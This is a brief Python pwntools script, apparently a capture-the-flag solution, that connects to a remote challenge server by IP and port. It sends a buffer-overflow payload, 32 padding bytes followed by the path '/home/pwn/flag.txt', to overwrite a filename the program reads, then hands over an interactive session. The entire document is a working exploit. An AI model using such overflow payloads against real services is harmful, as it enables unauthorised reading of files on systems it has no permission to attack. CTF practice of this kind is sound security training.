from pwn import *

elf = ELF("./chall")
# io = process(elf.path)
io = remote("153.127.194.19", 9080)

payload = b"a" * 32
payload += b"/home/pwn/flag.txt"
io.sendlineafter("Your pet name?: ", payload)

io.interactive()

